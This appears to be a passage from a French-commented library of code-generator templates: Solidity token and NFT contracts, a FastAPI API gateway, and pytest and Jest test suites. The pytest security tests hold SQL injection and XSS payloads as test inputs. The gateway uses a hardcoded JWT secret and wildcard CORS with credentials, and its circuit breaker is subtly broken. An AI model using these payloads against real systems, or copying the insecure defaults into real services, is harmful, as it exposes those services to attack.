        _;
    }
    
    modifier respectCooldown(address account) {
        require(
            block.timestamp >= lastTransferTime[account] + transferCooldown,
            "Transfer cooldown not met"
        );
        _;
    }
    
    // ========================================
    // CONSTRUCTOR
    // ========================================
    
    constructor(
        string memory name,
        string memory symbol,
        address _feeRecipient
    ) ERC20(name, symbol) {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(MINTER_ROLE, msg.sender);
        _grantRole(BURNER_ROLE, msg.sender);
        _grantRole(PAUSER_ROLE, msg.sender);
        
        feeRecipient = _feeRecipient;
        _mint(msg.sender, INITIAL_SUPPLY);
    }
    
    // ========================================
    // MINT & BURN
    // ========================================
    
    function mint(address to, uint256 amount)
        public
        onlyRole(MINTER_ROLE)
        whenNotPaused
    {
        require(totalSupply() + amount <= MAX_SUPPLY, "Max supply exceeded");
        _mint(to, amount);
        emit TokensMinted(to, amount);
    }
    
    function burn(uint256 amount)
        public
        onlyRole(BURNER_ROLE)
    {
        _burn(msg.sender, amount);
        emit TokensBurned(msg.sender, amount);
    }
    
    function burnFrom(address account, uint256 amount)
        public
        onlyRole(BURNER_ROLE)
    {
        uint256 currentAllowance = allowance(account, msg.sender);
        require(currentAllowance >= amount, "Burn amount exceeds allowance");
        _approve(account, msg.sender, currentAllowance - amount);
        _burn(account, amount);
        emit TokensBurned(account, amount);
    }
    
    // ========================================
    // TRANSFERS WITH FEES
    // ========================================
    
    function transfer(address to, uint256 amount)
        public
        virtual
        override
        whenNotPaused
        notBlacklisted(msg.sender)
        notBlacklisted(to)
        respectCooldown(msg.sender)
        returns (bool)
    {
        address owner = msg.sender;
        
        // Calculer les frais
        uint256 feeAmount = (amount * transferFee) / 10000;
        uint256 amountAfterFee = amount - feeAmount;
        
        // Transférer les frais
        if (feeAmount > 0 && feeRecipient != address(0)) {
            _transfer(owner, feeRecipient, feeAmount);
        }
        
        // Transférer le montant principal
        _transfer(owner, to, amountAfterFee);
        
        // Mettre à jour le cooldown
        lastTransferTime[owner] = block.timestamp;
        
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount)
        public
        virtual
        override
        whenNotPaused
        notBlacklisted(from)
        notBlacklisted(to)
        returns (bool)
    {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        
        // Calculer les frais
        uint256 feeAmount = (amount * transferFee) / 10000;
        uint256 amountAfterFee = amount - feeAmount;
        
        // Transférer les frais
        if (feeAmount > 0 && feeRecipient != address(0)) {
            _transfer(from, feeRecipient, feeAmount);
        }
        
        // Transférer le montant principal
        _transfer(from, to, amountAfterFee);
        
        return true;
    }
    
    // ========================================
    // ADMIN FUNCTIONS
    // ========================================
    
    function pause() public onlyRole(PAUSER_ROLE) {
        _pause();
    }
    
    function unpause() public onlyRole(PAUSER_ROLE) {
        _unpause();
    }
    
    function addToBlacklist(address account)
        public
        onlyRole(DEFAULT_ADMIN_ROLE)
    {
        require(!blacklist[account], "Already blacklisted");
        blacklist[account] = true;
        emit Blacklisted(account);
    }
    
    function removeFromBlacklist(address account)
        public
        onlyRole(DEFAULT_ADMIN_ROLE)
    {
        require(blacklist[account], "Not blacklisted");
        blacklist[account] = false;
        emit Unblacklisted(account);
    }
    
    function setTransferFee(uint256 newFee)
        public
        onlyRole(DEFAULT_ADMIN_ROLE)
    {
        require(newFee <= 1000, "Fee too high"); // Max 10%
        transferFee = newFee;
        emit FeeUpdated(newFee);
    }
    
    function setFeeRecipient(address newRecipient)
        public
        onlyRole(DEFAULT_ADMIN_ROLE)
    {
        require(newRecipient != address(0), "Invalid recipient");
        feeRecipient = newRecipient;
        emit FeeRecipientUpdated(newRecipient);
    }
    
    function setTransferCooldown(uint256 newCooldown)
        public
        onlyRole(DEFAULT_ADMIN_ROLE)
    {
        require(newCooldown <= 1 hours, "Cooldown too long");
        transferCooldown = newCooldown;
    }
    
    // ========================================
    // EMERGENCY FUNCTIONS
    // ========================================
    
    function emergencyWithdraw(address token, uint256 amount)
        public
        onlyRole(DEFAULT_ADMIN_ROLE)
        nonReentrant
    {
        if (token == address(0)) {
            // Withdraw ETH
            payable(msg.sender).transfer(amount);
        } else {
            // Withdraw ERC20
            IERC20(token).transfer(msg.sender, amount);
        }
    }
    
    // ========================================
    // VIEW FUNCTIONS
    // ========================================
    
    function getCirculatingSupply() public view returns (uint256) {
        return totalSupply();
    }
    
    function getRemainingSupply() public view returns (uint256) {
        return MAX_SUPPLY - totalSupply();
    }
    
    function isBlacklisted(address account) public view returns (bool) {
        return blacklist[account];
    }
    
    // Receive ETH
    receive() external payable {}
}

// ===== NFT Contract (ERC-721) =====

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

contract AdvancedNFT is ERC721URIStorage, AccessControl, Pausable {
    using Counters for Counters.Counter;
    
    Counters.Counter private _tokenIds;
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    
    uint256 public constant MAX_SUPPLY = 10000;
    uint256 public mintPrice = 0.1 ether;
    
    mapping(uint256 => uint256) public tokenRarity; // 1=common, 2=rare, 3=legendary
    
    constructor(string memory name, string memory symbol)
        ERC721(name, symbol)
    {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(MINTER_ROLE, msg.sender);
    }
    
    function mint(address to, string memory tokenURI, uint256 rarity)
        public
        payable
        onlyRole(MINTER_ROLE)
        returns (uint256)
    {
        require(_tokenIds.current() < MAX_SUPPLY, "Max supply reached");
        require(msg.value >= mintPrice, "Insufficient payment");
        require(rarity >= 1 && rarity <= 3, "Invalid rarity");
        
        _tokenIds.increment();
        uint256 newTokenId = _tokenIds.current();
        
        _mint(to, newTokenId);
        _setTokenURI(newTokenId, tokenURI);
        tokenRarity[newTokenId] = rarity;
        
        return newTokenId;
    }
    
    function supportsInterface(bytes4 interfaceId)
        public
        view
        override(ERC721URIStorage, AccessControl)
        returns (bool)
    {
        return super.supportsInterface(interfaceId);
    }
}
"""
    },
    
    # ========================================
    # MICROSERVICES PATTERNS - 10 TEMPLATES
    # ========================================
    
    "microservices_api_gateway": {
        "patterns": ["api gateway", "passerelle api", "microservices gateway"],
        "template": """# ===== API Gateway pour Microservices =====
from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx
import asyncio
from typing import Dict, List, Optional
import logging
from datetime import datetime, timedelta
from collections import defaultdict
import jwt

app = FastAPI(title="API Gateway", version="1.0.0")

# ========================================
# CONFIGURATION
# ========================================

class Config:
    SERVICES = {
        'auth': 'http://auth-service:8001',
        'users': 'http://users-service:8002',
        'products': 'http://products-service:8003',
        'orders': 'http://orders-service:8004',
        'payments': 'http://payments-service:8005'
    }
    
    JWT_SECRET = "your-secret-key"
    JWT_ALGORITHM = "HS256"
    
    RATE_LIMIT = 100  # requests per minute
    TIMEOUT = 30  # seconds
    
    CIRCUIT_BREAKER_THRESHOLD = 5
    CIRCUIT_BREAKER_TIMEOUT = 60

# ========================================
# MIDDLEWARE
# ========================================

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Rate Limiting
rate_limit_storage = defaultdict(list)

async def rate_limiter(request: Request):
    client_ip = request.client.host
    now = datetime.now()
    
    # Nettoyer les anciennes requêtes
    rate_limit_storage[client_ip] = [
        timestamp for timestamp in rate_limit_storage[client_ip]
        if now - timestamp < timedelta(minutes=1)
    ]
    
    # Vérifier la limite
    if len(rate_limit_storage[client_ip]) >= Config.RATE_LIMIT:
        raise HTTPException(
            status_code=429,
            detail="Rate limit exceeded. Try again later."
        )
    
    rate_limit_storage[client_ip].append(now)

# Authentication
def verify_token(token: str) -> Dict:
    try:
        payload = jwt.decode(
            token,
            Config.JWT_SECRET,
            algorithms=[Config.JWT_ALGORITHM]
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

async def get_current_user(request: Request) -> Dict:
    token = request.headers.get("Authorization")
    if not token or not token.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing authentication token")
    
    token = token.split("Bearer ")[1]
    return verify_token(token)

# ========================================
# CIRCUIT BREAKER
# ========================================

class CircuitBreaker:
    def __init__(self, threshold: int, timeout: int):
        self.threshold = threshold
        self.timeout = timeout
        self.failures = defaultdict(int)
        self.last_failure_time = defaultdict(lambda: datetime.min)
        self.state = defaultdict(lambda: "closed")  # closed, open, half-open
    
    def call(self, service: str, func):
        # Vérifier l'état
        if self.state[service] == "open":
            if datetime.now() - self.last_failure_time[service] > timedelta(seconds=self.timeout):
                self.state[service] = "half-open"
            else:
                raise HTTPException(
                    status_code=503,
                    detail=f"Service {service} is unavailable (circuit breaker open)"
                )
        
        try:
            result = func()
            
            # Succès: réinitialiser
            if self.state[service] == "half-open":
                self.state[service] = "closed"
                self.failures[service] = 0
            
            return result
        
        except Exception as e:
            self.failures[service] += 1
            self.last_failure_time[service] = datetime.now()
            
            if self.failures[service] >= self.threshold:
                self.state[service] = "open"
                logging.error(f"Circuit breaker opened for {service}")
            
            raise e

circuit_breaker = CircuitBreaker(
    threshold=Config.CIRCUIT_BREAKER_THRESHOLD,
    timeout=Config.CIRCUIT_BREAKER_TIMEOUT
)

# ========================================
# SERVICE PROXY
# ========================================

async def proxy_request(
    service: str,
    path: str,
    method: str,
    headers: Dict = None,
    body: Optional[Dict] = None
) -> Dict:
    if service not in Config.SERVICES:
        raise HTTPException(status_code=404, detail=f"Service {service} not found")
    
    url = f"{Config.SERVICES[service]}{path}"
    
    async def make_request():
        async with httpx.AsyncClient(timeout=Config.TIMEOUT) as client:
            try:
                response = await client.request(
                    method=method,
                    url=url,
                    headers=headers,
                    json=body
                )
                response.raise_for_status()
                return response.json()
            except httpx.HTTPError as e:
                logging.error(f"Request to {service} failed: {e}")
                raise HTTPException(
                    status_code=503,
                    detail=f"Service {service} unavailable"
                )
    
    return await circuit_breaker.call(service, make_request)

# ========================================
# API COMPOSITION
# ========================================

async def aggregate_data(user_id: str) -> Dict:
    \"\"\"Aggrège les données de plusieurs services.\"\"\"
    
    async def get_user():
        return await proxy_request('users', f'/users/{user_id}', 'GET')
    
    async def get_orders():
        return await proxy_request('orders', f'/orders/user/{user_id}', 'GET')
    
    async def get_payments():
        return await proxy_request('payments', f'/payments/user/{user_id}', 'GET')
    
    # Exécuter en parallèle
    results = await asyncio.gather(
        get_user(),
        get_orders(),
        get_payments(),
        return_exceptions=True
    )
    
    user_data, orders_data, payments_data = results
    
    # Gérer les erreurs
    return {
        'user': user_data if not isinstance(user_data, Exception) else None,
        'orders': orders_data if not isinstance(orders_data, Exception) else [],
        'payments': payments_data if not isinstance(payments_data, Exception) else [],
        'aggregated_at': datetime.now().isoformat()
    }

# ========================================
# ROUTES
# ========================================

@app.get("/health")
async def health_check():
    \"\"\"Health check endpoint.\"\"\"
    service_health = {}
    
    for service, url in Config.SERVICES.items():
        try:
            async with httpx.AsyncClient(timeout=5) as client:
                response = await client.get(f"{url}/health")
                service_health[service] = "healthy" if response.status_code == 200 else "unhealthy"
        except:
            service_health[service] = "unreachable"
    
    return {
        'status': 'ok',
        'services': service_health,
        'timestamp': datetime.now().isoformat()
    }

# Auth routes
@app.post("/auth/register")
async def register(request: Request, _: None = Depends(rate_limiter)):
    body = await request.json()
    return await proxy_request('auth', '/register', 'POST', body=body)

@app.post("/auth/login")
async def login(request: Request, _: None = Depends(rate_limiter)):
    body = await request.json()
    return await proxy_request('auth', '/login', 'POST', body=body)

# User routes
@app.get("/users/{user_id}")
async def get_user(
    user_id: str,
    current_user: Dict = Depends(get_current_user)
):
    return await proxy_request('users', f'/users/{user_id}', 'GET')

@app.get("/users/{user_id}/profile")
async def get_user_profile(
    user_id: str,
    current_user: Dict = Depends(get_current_user)
):
    \"\"\"Agrège les données de profil depuis plusieurs services.\"\"\"
    return await aggregate_data(user_id)

# Products routes
@app.get("/products")
async def get_products(
    category: Optional[str] = None,
    page: int = 1,
    limit: int = 10
):
    path = f"/products?page={page}&limit={limit}"
    if category:
        path += f"&category={category}"
    return await proxy_request('products', path, 'GET')

@app.get("/products/{product_id}")
async def get_product(product_id: str):
    return await proxy_request('products', f'/products/{product_id}', 'GET')

# Orders routes
@app.post("/orders")
async def create_order(
    request: Request,
    current_user: Dict = Depends(get_current_user)
):
    body = await request.json()
    return await proxy_request(
        'orders',
        '/orders',
        'POST',
        headers={'X-User-Id': current_user['id']},
        body=body
    )

@app.get("/orders/{order_id}")
async def get_order(
    order_id: str,
    current_user: Dict = Depends(get_current_user)
):
    return await proxy_request('orders', f'/orders/{order_id}', 'GET')

# Payments routes
@app.post("/payments")
async def process_payment(
    request: Request,
    current_user: Dict = Depends(get_current_user)
):
    body = await request.json()
    return await proxy_request(
        'payments',
        '/payments',
        'POST',
        headers={'X-User-Id': current_user['id']},
        body=body
    )

# ========================================
# ERROR HANDLERS
# ========================================

@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    return JSONResponse(
        status_code=exc.status_code,
        content={
            'error': exc.detail,
            'path': request.url.path,
            'timestamp': datetime.now().isoformat()
        }
    )

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    logging.error(f"Unhandled exception: {exc}")
    return JSONResponse(
        status_code=500,
        content={
            'error': 'Internal server error',
            'path': request.url.path,
            'timestamp': datetime.now().isoformat()
        }
    )

# ========================================
# STARTUP
# ========================================

@app.on_event("startup")
async def startup_event():
    logging.info("API Gateway started")
    logging.info(f"Registered services: {list(Config.SERVICES.keys())}")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
"""
    },

    # ========================================
    # TESTING - PYTEST ADVANCED
    # ========================================
    
    "pytest_complete_suite": {
        "patterns": ["pytest", "test complet", "suite de tests", "fixtures", "parametrize", "mocks", "coverage"],
        "template": """
# ========================================
# PYTEST - SUITE DE TESTS COMPLÈTE
# ========================================

import pytest
import asyncio
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from typing import Generator, AsyncGenerator
import tempfile
import os
from datetime import datetime, timedelta
from freezegun import freeze_time

# ========================================
# CONFIGURATION PYTEST
# ========================================

# conftest.py
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from app import create_app
from app.models import Base

@pytest.fixture(scope="session")
def app():
    '''Application Flask pour les tests'''
    app = create_app("testing")
    return app

@pytest.fixture(scope="session")
def client(app):
    '''Client de test Flask'''
    return app.test_client()

@pytest.fixture(scope="function")
def db_session():
    '''Session de base de données temporaire'''
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    session = Session()
    
    yield session
    
    session.close()
    Base.metadata.drop_all(engine)

@pytest.fixture(scope="function")
def temp_directory():
    '''Répertoire temporaire pour les tests'''
    with tempfile.TemporaryDirectory() as tmpdir:
        yield tmpdir

@pytest.fixture(scope="function")
def mock_redis():
    '''Mock de connexion Redis'''
    mock = MagicMock()
    mock.get.return_value = None
    mock.set.return_value = True
    mock.delete.return_value = True
    return mock

@pytest.fixture(scope="function")
async def async_client():
    '''Client asynchrone pour les tests'''
    from httpx import AsyncClient
    from app import app
    
    async with AsyncClient(app=app, base_url="http://test") as client:
        yield client

# ========================================
# FIXTURES COMPOSÉES
# ========================================

@pytest.fixture
def user_data():
    '''Données utilisateur de test'''
    return {
        "username": "testuser",
        "email": "test@example.com",
        "password": "SecurePass123!",
        "first_name": "Test",
        "last_name": "User"
    }

@pytest.fixture
def authenticated_user(client, user_data):
    '''Utilisateur authentifié'''
    # Créer l'utilisateur
    client.post("/api/auth/register", json=user_data)
    
    # Authentification
    response = client.post("/api/auth/login", json={
        "username": user_data["username"],
        "password": user_data["password"]
    })
    
    token = response.json["access_token"]
    
    return {
        "token": token,
        "headers": {"Authorization": f"Bearer {token}"},
        "data": user_data
    }

# ========================================
# TESTS PARAMÉTRÉS
# ========================================

@pytest.mark.parametrize("username,email,password,expected_status", [
    ("validuser", "valid@email.com", "SecurePass123!", 201),
    ("ab", "valid@email.com", "SecurePass123!", 400),  # Username trop court
    ("validuser", "invalid-email", "SecurePass123!", 400),  # Email invalide
    ("validuser", "valid@email.com", "weak", 400),  # Mot de passe faible
    ("", "valid@email.com", "SecurePass123!", 400),  # Username vide
])
def test_user_registration_validation(client, username, email, password, expected_status):
    '''Test de validation lors de l'inscription'''
    response = client.post("/api/auth/register", json={
        "username": username,
        "email": email,
        "password": password
    })
    
    assert response.status_code == expected_status

# ========================================
# TESTS ASYNCHRONES
# ========================================

@pytest.mark.asyncio
async def test_async_database_operations(db_session):
    '''Test des opérations asynchrones de base de données'''
    from app.models import User
    from app.services import UserService
    
    service = UserService(db_session)
    
    # Création asynchrone
    user = await service.create_user(
        username="asyncuser",
        email="async@test.com",
        password="password123"
    )
    
    assert user.id is not None
    assert user.username == "asyncuser"
    
    # Récupération asynchrone
    fetched_user = await service.get_user(user.id)
    assert fetched_user.email == "async@test.com"
    
    # Mise à jour asynchrone
    await service.update_user(user.id, email="newemail@test.com")
    updated_user = await service.get_user(user.id)
    assert updated_user.email == "newemail@test.com"
    
    # Suppression asynchrone
    await service.delete_user(user.id)
    deleted_user = await service.get_user(user.id)
    assert deleted_user is None

# ========================================
# MOCKING ET PATCHING
# ========================================

@patch('app.services.email.EmailService.send_email')
def test_email_sending_on_registration(mock_send_email, client, user_data):
    '''Test de l'envoi d'email lors de l'inscription'''
    mock_send_email.return_value = True
    
    response = client.post("/api/auth/register", json=user_data)
    
    assert response.status_code == 201
    mock_send_email.assert_called_once()
    
    # Vérifier les arguments de l'appel
    call_args = mock_send_email.call_args
    assert call_args[1]["to"] == user_data["email"]
    assert "Welcome" in call_args[1]["subject"]

@patch('app.external.payment_gateway.PaymentGateway')
def test_payment_processing(mock_gateway, client, authenticated_user):
    '''Test du traitement des paiements avec mock'''
    # Configuration du mock
    mock_instance = mock_gateway.return_value
    mock_instance.process_payment.return_value = {
        "status": "success",
        "transaction_id": "TXN123456"
    }
    
    # Effectuer un paiement
    response = client.post(
        "/api/payments",
        headers=authenticated_user["headers"],
        json={
            "amount": 99.99,
            "currency": "USD",
            "card_number": "4111111111111111"
        }
    )
    
    assert response.status_code == 200
    assert response.json["transaction_id"] == "TXN123456"
    mock_instance.process_payment.assert_called_once()

# ========================================
# TESTS AVEC FREEZE_TIME
# ========================================

@freeze_time("2024-01-15 12:00:00")
def test_token_expiration():
    '''Test de l'expiration des tokens JWT'''
    from app.utils.jwt import create_token, verify_token
    
    # Créer un token avec expiration de 1 heure
    token = create_token(user_id=1, expires_in=3600)
    
    # Vérifier immédiatement - doit être valide
    payload = verify_token(token)
    assert payload["user_id"] == 1
    
    # Avancer le temps de 2 heures
    with freeze_time("2024-01-15 14:00:00"):
        # Le token doit être expiré
        with pytest.raises(Exception) as exc_info:
            verify_token(token)
        assert "expired" in str(exc_info.value).lower()

# ========================================
# TESTS D'INTÉGRATION
# ========================================

def test_complete_user_workflow(client, user_data):
    '''Test du workflow complet utilisateur'''
    # 1. Inscription
    response = client.post("/api/auth/register", json=user_data)
    assert response.status_code == 201
    
    # 2. Connexion
    response = client.post("/api/auth/login", json={
        "username": user_data["username"],
        "password": user_data["password"]
    })
    assert response.status_code == 200
    token = response.json["access_token"]
    
    headers = {"Authorization": f"Bearer {token}"}
    
    # 3. Récupérer le profil
    response = client.get("/api/users/me", headers=headers)
    assert response.status_code == 200
    assert response.json["username"] == user_data["username"]
    
    # 4. Mettre à jour le profil
    response = client.put(
        "/api/users/me",
        headers=headers,
        json={"first_name": "UpdatedName"}
    )
    assert response.status_code == 200
    assert response.json["first_name"] == "UpdatedName"
    
    # 5. Déconnexion
    response = client.post("/api/auth/logout", headers=headers)
    assert response.status_code == 200
    
    # 6. Vérifier que le token est invalide
    response = client.get("/api/users/me", headers=headers)
    assert response.status_code == 401

# ========================================
# TESTS DE PERFORMANCE
# ========================================

@pytest.mark.benchmark
def test_database_query_performance(benchmark, db_session):
    '''Test de performance des requêtes'''
    from app.models import User
    
    # Créer 1000 utilisateurs
    users = [
        User(username=f"user{i}", email=f"user{i}@test.com")
        for i in range(1000)
    ]
    db_session.bulk_save_objects(users)
    db_session.commit()
    
    # Benchmarker la requête
    result = benchmark(lambda: db_session.query(User).filter(
        User.username.like("user5%")
    ).all())
    
    assert len(result) > 0

# ========================================
# TESTS D'EXCEPTION
# ========================================

def test_database_constraint_violation(db_session, user_data):
    '''Test des violations de contraintes'''
    from app.models import User
    from sqlalchemy.exc import IntegrityError
    
    # Créer le premier utilisateur
    user1 = User(**user_data)
    db_session.add(user1)
    db_session.commit()
    
    # Essayer de créer un utilisateur avec le même email
    user2 = User(**user_data)
    db_session.add(user2)
    
    with pytest.raises(IntegrityError):
        db_session.commit()
    
    db_session.rollback()

# ========================================
# TESTS DE SÉCURITÉ
# ========================================

def test_sql_injection_prevention(client):
    '''Test de la prévention des injections SQL'''
    malicious_input = "'; DROP TABLE users; --"
    
    response = client.post("/api/auth/login", json={
        "username": malicious_input,
        "password": "password"
    })
    
    # Ne doit pas causer d'erreur serveur
    assert response.status_code in [400, 401]
    
    # Vérifier que la table existe toujours
    response = client.get("/api/users")
    assert response.status_code != 500

def test_xss_prevention(client, authenticated_user):
    '''Test de la prévention XSS'''
    xss_payload = "<script>alert('XSS')</script>"
    
    response = client.post(
        "/api/posts",
        headers=authenticated_user["headers"],
        json={"content": xss_payload}
    )
    
    assert response.status_code == 201
    
    # Récupérer le post
    post_id = response.json["id"]
    response = client.get(f"/api/posts/{post_id}")
    
    # Le contenu doit être échappé
    content = response.json["content"]
    assert "<script>" not in content
    assert "&lt;script&gt;" in content or "alert" not in content

# ========================================
# TESTS DE FIXTURES PERSONNALISÉES
# ========================================

@pytest.fixture
def mock_external_api():
    '''Mock d'une API externe'''
    with patch('requests.get') as mock_get:
        mock_get.return_value.status_code = 200
        mock_get.return_value.json.return_value = {
            "data": "mocked_response"
        }
        yield mock_get

def test_external_api_integration(mock_external_api):
    '''Test de l'intégration avec une API externe'''
    from app.services import ExternalAPIService
    
    service = ExternalAPIService()
    result = service.fetch_data("some_endpoint")
    
    assert result["data"] == "mocked_response"
    mock_external_api.assert_called_once()

# ========================================
# TESTS AVEC MARKERS PERSONNALISÉS
# ========================================

@pytest.mark.slow
@pytest.mark.integration
def test_slow_integration_process(client):
    '''Test d'intégration lent'''
    # Processus long...
    pass

@pytest.mark.skip(reason="Feature not yet implemented")
def test_future_feature():
    '''Test d'une fonctionnalité future'''
    pass

@pytest.mark.xfail(reason="Known bug #123")
def test_known_bug():
    '''Test d'un bug connu'''
    assert False

# Lancer les tests:
# pytest --cov=app --cov-report=html --cov-report=term
# pytest -v -s
# pytest -m "not slow"
# pytest --benchmark-only
"""
    },

    # ========================================
    # TESTING - JEST & REACT TESTING LIBRARY
    # ========================================
    
    "jest_react_testing": {
        "patterns": ["jest", "react testing library", "test react", "test components", "mock hooks"],
        "template": """
// ========================================
// JEST & REACT TESTING LIBRARY - SUITE COMPLÈTE
// ========================================

import React from 'react';
import { render, screen, fireEvent, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { renderHook, act } from '@testing-library/react-hooks';
import '@testing-library/jest-dom';
import { rest } from 'msw';
import { setupServer } from 'msw/node';
import { BrowserRouter } from 'react-router-dom';
import { Provider } from 'react-redux';
import configureStore from 'redux-mock-store';

// ========================================
// CONFIGURATION JEST
// ========================================

// jest.config.js
module.exports = {
  testEnvironment: 'jsdom',
  setupFilesAfterEnv: ['<rootDir>/src/setupTests.ts'],
  moduleNameMapper: {
    '\\\\.(css|less|scss|sass)$': 'identity-obj-proxy',
    '^@/(.*)$': '<rootDir>/src/$1'
  },
  collectCoverageFrom: [
    'src/**/*.{js,jsx,ts,tsx}',
    '!src/**/*.d.ts',
    '!src/index.tsx',
    '!src/reportWebVitals.ts'
  ],
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    }
  }
};

// setupTests.ts
import '@testing-library/jest-dom';
import { server } from './mocks/server';

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());

// ========================================
// MSW SERVER MOCK
// ========================================

// mocks/server.ts
const server = setupServer(
  rest.get('/api/users', (req, res, ctx) => {
    return res(
      ctx.status(200),
      ctx.json([
        { id: 1, name: 'John Doe', email: 'john@example.com' },
        { id: 2, name: 'Jane Smith', email: 'jane@example.com' }
      ])
    );
  }),
  
  rest.post('/api/auth/login', (req, res, ctx) => {
    const { username, password } = req.body as any;
    
    if (username === 'testuser' && password === 'password123') {
      return res(
        ctx.status(200),
        ctx.json({
          token: 'mock-jwt-token',
          user: { id: 1, username: 'testuser' }
        })
      );
    }
    
    return res(
      ctx.status(401),
      ctx.json({ message: 'Invalid credentials' })
    );
  })
);

export { server, rest };

// ========================================
// HELPERS DE TEST
// ========================================

// test-utils.tsx
const mockStore = configureStore([]);

interface RenderOptions {
  initialState?: any;
  store?: any;
  route?: string;
}

function renderWithProviders(
  ui: React.ReactElement,
  {
    initialState = {},
    store = mockStore(initialState),
    route = '/',
    ...renderOptions
  }: RenderOptions = {}
) {
  window.history.pushState({}, 'Test page', route);
  
  function Wrapper({ children }: { children: React.ReactNode }) {
    return (
      <Provider store={store}>
        <BrowserRouter>
          {children}
        </BrowserRouter>
      </Provider>
    );
  }
  
  return {
    store,
    ...render(ui, { wrapper: Wrapper, ...renderOptions })
  };
}

// ========================================
// TESTS DE COMPOSANTS
// ========================================

// Button.test.tsx
import Button from '@/components/Button';

describe('Button Component', () => {
  it('renders with correct text', () => {
    render(<Button>Click me</Button>);
    expect(screen.getByRole('button', { name: /click me/i })).toBeInTheDocument();
  });
  
  it('calls onClick handler when clicked', async () => {
    const handleClick = jest.fn();
    render(<Button onClick={handleClick}>Click me</Button>);
    
    const button = screen.getByRole('button');
    await userEvent.click(button);
    
    expect(handleClick).toHaveBeenCalledTimes(1);
  });
  
  it('is disabled when disabled prop is true', () => {
    render(<Button disabled>Click me</Button>);
    expect(screen.getByRole('button')).toBeDisabled();
  });
  
  it('applies custom className', () => {
    render(<Button className="custom-class">Click me</Button>);
    expect(screen.getByRole('button')).toHaveClass('custom-class');
  });
});

// ========================================
// TESTS DE FORMULAIRES
// ========================================

// LoginForm.test.tsx
import LoginForm from '@/components/LoginForm';

describe('LoginForm Component', () => {
  it('submits form with valid credentials', async () => {
    const onSubmit = jest.fn();
    render(<LoginForm onSubmit={onSubmit} />);
    
    // Remplir le formulaire
    await userEvent.type(screen.getByLabelText(/username/i), 'testuser');
    await userEvent.type(screen.getByLabelText(/password/i), 'password123');
    
    // Soumettre
    await userEvent.click(screen.getByRole('button', { name: /login/i }));
    
    await waitFor(() => {
      expect(onSubmit).toHaveBeenCalledWith({
        username: 'testuser',
        password: 'password123'
      });
    });
  });
  
  it('shows validation errors for empty fields', async () => {
    render(<LoginForm onSubmit={jest.fn()} />);
    
    // Soumettre sans remplir
    await userEvent.click(screen.getByRole('button', { name: /login/i }));
    
    expect(await screen.findByText(/username is required/i)).toBeInTheDocument();
    expect(await screen.findByText(/password is required/i)).toBeInTheDocument();
  });
  
  it('toggles password visibility', async () => {
    render(<LoginForm onSubmit={jest.fn()} />);
    
    const passwordInput = screen.getByLabelText(/password/i);
    const toggleButton = screen.getByRole('button', { name: /show password/i });
    
    expect(passwordInput).toHaveAttribute('type', 'password');
    
    await userEvent.click(toggleButton);
    expect(passwordInput).toHaveAttribute('type', 'text');
    
    await userEvent.click(toggleButton);
    expect(passwordInput).toHaveAttribute('type', 'password');
  });
});

// ========================================
// TESTS AVEC HOOKS PERSONNALISÉS
// ========================================

// useFetch.test.ts
import { useFetch } from '@/hooks/useFetch';

describe('useFetch Hook', () => {
  it('fetches data successfully', async () => {
    const { result, waitForNextUpdate } = renderHook(() =>
      useFetch('/api/users')
    );
    
    expect(result.current.loading).toBe(true);
    expect(result.current.data).toBeNull();
    
    await waitForNextUpdate();
    
    expect(result.current.loading).toBe(false);
    expect(result.current.data).toHaveLength(2);
    expect(result.current.error).toBeNull();
  });
  
  it('handles errors', async () => {
    server.use(
      rest.get('/api/users', (req, res, ctx) => {
        return res(ctx.status(500), ctx.json({ message: 'Server error' }));
      })
    );
    
    const { result, waitForNextUpdate } = renderHook(() =>
      useFetch('/api/users')
    );
    
    await waitForNextUpdate();
    
    expect(result.current.loading).toBe(false);
    expect(result.current.error).toBe('Server error');
    expect(result.current.data).toBeNull();
  });
  
  it('refetches data when called', async () => {
    const { result, waitForNextUpdate } = renderHook(() =>
      useFetch('/api/users')
    );
    
    await waitForNextUpdate();
    
    const initialData = result.current.data;
    
    act(() => {
      result.current.refetch();
    });
    
    await waitForNextUpdate();
    
    expect(result.current.data).toEqual(initialData);
  });
});

// ========================================
// TESTS D'INTÉGRATION
// ========================================

// UserList.test.tsx
import UserList from '@/pages/UserList';

describe('UserList Page', () => {
  it('displays users from API', async () => {
    renderWithProviders(<UserList />);
    
    expect(screen.getByText(/loading/i)).toBeInTheDocument();
    
    await waitFor(() => {
      expect(screen.queryByText(/loading/i)).not.toBeInTheDocument();
    });
    
    expect(screen.getByText('John Doe')).toBeInTheDocument();
    expect(screen.getByText('Jane Smith')).toBeInTheDocument();
  });
  
  it('filters users by search term', async () => {
    renderWithProviders(<UserList />);
    
    await waitFor(() => {
      expect(screen.getByText('John Doe')).toBeInTheDocument();
    });
    
    const searchInput = screen.getByPlaceholderText(/search users/i);
    await userEvent.type(searchInput, 'Jane');
    
    expect(screen.queryByText('John Doe')).not.toBeInTheDocument();
